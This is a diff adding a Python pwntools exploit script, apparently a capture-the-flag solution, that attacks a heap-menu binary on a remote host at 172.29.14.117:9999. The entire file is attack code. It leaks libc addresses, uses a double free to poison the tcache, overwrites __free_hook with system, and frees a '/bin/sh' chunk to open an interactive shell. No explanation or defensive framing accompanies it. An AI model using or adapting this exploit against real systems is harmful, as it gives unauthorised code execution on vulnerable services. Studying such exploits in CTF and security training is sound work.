@@ -1,0 +1,67 @@
+from PwnContext import *
+
+ctx.binary='./source'
+binary=ctx.binary
+ctx.remote_libc='./libc.so'
+libc=ctx.remote_libc
+ctx.debug_remote_libc=True
+ctx.remote=('172.29.14.117',9999)
+ctx.start('remote')
+context(log_level='debug')
+
+def add(size,name,phone):
+    ctx.sendline('1')
+    ctx.recvuntil("Please input the size of compary's name\n")
+    ctx.sendline(str(size))
+    ctx.recvuntil('please input name:\n')
+    ctx.send(name)
+    ctx.recvuntil('please input compary call:\n')
+    ctx.send(phone)
+    ctx.recvuntil('Done!\n')
+
+def show(index):
+    ctx.sendline('2')
+    ctx.recvuntil('Please input the index:\n')
+    ctx.sendline(str(index))
+
+def call(index):
+    ctx.sendline('3')
+    ctx.recvuntil('Please input the index:\n')
+    ctx.sendline(str(index))
+    ctx.recvuntil('Done\n')
+
+def main():
+    add(0x500,'a','b') # index 0
+    add(0x10,'/bin/sh\x00','/bin/sh\x00')   # index 1
+
+    call(0)
+    add(0x4e0,'a'*8,'b'*8) # index 2
+    
+    show(2)
+    ctx.recvuntil('a'*8)
+    libc_base = u64(ctx.recv(6)+'\x00\x00')-libc.symbols['__malloc_hook']-0x70
+    print "libc_base ->" + hex(libc_base)
+    
+    one_gadget=libc_base+0x4f2c5
+    print "one_gadget -> " + hex(libc_base)
+    
+    system=libc_base+libc.symbols['system']
+
+    free_hook=libc_base+libc.symbols['__free_hook']
+    
+    add(0x80,p64(free_hook)*2,'1') # index 3
+    call(3)
+    call(3)
+    pause()
+    add(0x80,p64(free_hook)*2,'1')
+    add(0x80,p64(free_hook)*2,'1')
+    add(0x80,p64(system),'1')
+    
+    ctx.sendline('3')
+    ctx.recvuntil('Please input the index:\n')
+    ctx.sendline('1')
+    ctx.interactive()
+
+    ctx.interactive()
+
+main()
